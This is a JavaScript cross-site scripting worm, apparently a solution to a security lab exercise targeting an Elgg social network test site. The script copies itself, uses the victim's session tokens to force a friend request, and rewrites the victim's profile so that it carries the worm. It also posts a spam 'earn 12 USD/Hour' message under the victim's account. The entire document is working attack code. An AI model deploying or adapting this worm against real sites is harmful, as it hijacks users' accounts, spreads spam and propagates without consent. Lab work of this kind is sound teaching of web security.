 <script id=worm type="text/javascript">
 	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
 	window.onload = function(){
 	//Adding friend
 	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();

	//Modifying profile
	var userName = elgg.session.user.username
	var uNameHeader = "&username="+userName
	var guid = elgg.session.user.guid
	var guidHeader = "&guid="+guid
    var url2 ="http://www.xsslabelgg.com/action/profile/edit" //FILL IN
	var content1 =ts+token+uNameHeader+guidHeader+"&description=1605053"+
	wormCode+
	"&accesslevel[description]=1"+
	"&briefdescription=worm test"+
	"&accesslevel[briefdescription]=1"+
	"&location=b"+
	"&accesslevel[location]=1"+
	"&interests=c"+
	"&accesslevel[interests]=1"+
	"&skills=d"+
	"&accesslevel[skills]=1"+
	"&contactemail=email@gmail.com"+
	"&accesslevel[contactemail]=1"+
	"&phone=f"+
	"&accesslevel[phone]=1"+
	"&mobile=g"+
	"&accesslevel[mobile]=1"+
	"&website=http://www.mysite.com"+
	"&accesslevel[website]=1"+
	"&twitter=i"+
	"&accesslevel[twitter]=1" //FILL IN
	
	if(userName!='samy' && guid!=47)
	{
		//Create and send Ajax request to modify profile
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",url2,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content1);
	}


    var url3 ="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content2 =ts+token+uNameHeader+guidHeader+
	"&body=To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/"+userName; //FILL IN
	
	if(userName!='samy' && guid!=47)
	{
		//Create and send Ajax request to modify profile
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",url3,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content2);
	}
	}
</script>